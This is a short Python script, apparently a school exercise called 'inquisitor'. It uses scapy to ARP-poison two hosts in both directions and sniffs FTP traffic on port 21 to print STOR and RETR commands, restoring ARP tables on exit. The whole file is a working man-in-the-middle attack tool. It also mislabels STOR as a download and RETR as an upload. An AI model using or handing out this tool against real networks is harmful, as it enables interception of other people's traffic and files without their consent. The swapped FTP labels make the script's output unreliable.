#!/usr/bin/env python3


import sys, socket, argparse, re, signal, time
from scapy.all import ARP, Ether, sniff, sendp, conf, TCP, UDP, Raw, send


def validate_ipv4(address):
    pattern = re.compile(r"^(?:(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
    return bool(pattern.match(address))


def validate_mac(address):
    pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    return bool(pattern.match(address))


def restore_arp_tables(src_ip, src_mac, target_ip, target_mac, interface='eth0'):
    arp_restore_src = ARP(pdst=target_ip, psrc=src_ip, hwdst=target_mac, hwsrc=src_mac, op=2)
    arp_restore_target = ARP(pdst=src_ip, psrc=target_ip, hwdst=src_mac, hwsrc=target_mac, op=2)
    
    send(arp_restore_src, verbose=False, count=3)
    send(arp_restore_target, verbose=False, count=3)
    
    print("Original ARP tables restored.")


def arp_poison(ip_target, mac_target, ip_src, mac_src, interface='eth0'):
    packet = ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
    send(packet, verbose=False, count=7)


def cleanup(signum, frame):
    print("\nStopping ARP poisoning and restoring network...")
    src_ip, src_mac, target_ip, target_mac = args.addresses
    restore_arp_tables(src_ip, src_mac, target_ip, target_mac)
    print("ARP Poisoning stopped.")
    sys.exit(0)


def callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load
        if b"STOR" in payload:
            print(f"Download FTP file transfer detected: {payload.decode(errors='ignore')}")
        if b"RETR" in payload:
            print(f"Upload FTP file transfer detected: {payload.decode(errors='ignore')}")


def ft_parser_args():
    parser = argparse.ArgumentParser(description='ARP poisoning,./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
    parser.add_argument('addresses', action='store', nargs=4, help="<IP-src> <MAC-src> <IP-target> <MAC-target>")
    return parser.parse_args()


def main():
    global args
    args = ft_parser_args()
    try:
        ip_src, mac_src, ip_target, mac_target = args.addresses
        if not validate_ipv4(ip_src) or not validate_ipv4(ip_target):
            print("Invalid IP address format")
            exit(1)
        if not validate_mac(mac_src) or not validate_mac(mac_target):
            print("Invalid MAC address format")
            exit(1)
        print("Valid IP addresses entered.")
        signal.signal(signal.SIGINT, cleanup)
        print(f"ARP Poisoning started. Press CTRL+C to stop.")
        while True:
            arp_poison(ip_target, mac_target, ip_src, mac_src)
            arp_poison(ip_src, mac_src, ip_target, mac_target)
            sniff(iface="eth0", filter="tcp port 21", prn=callback, timeout=10)
            time.sleep(2)
    except ValueError:
        print("Invalid IP address format")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")


if __name__ == "__main__":
    main()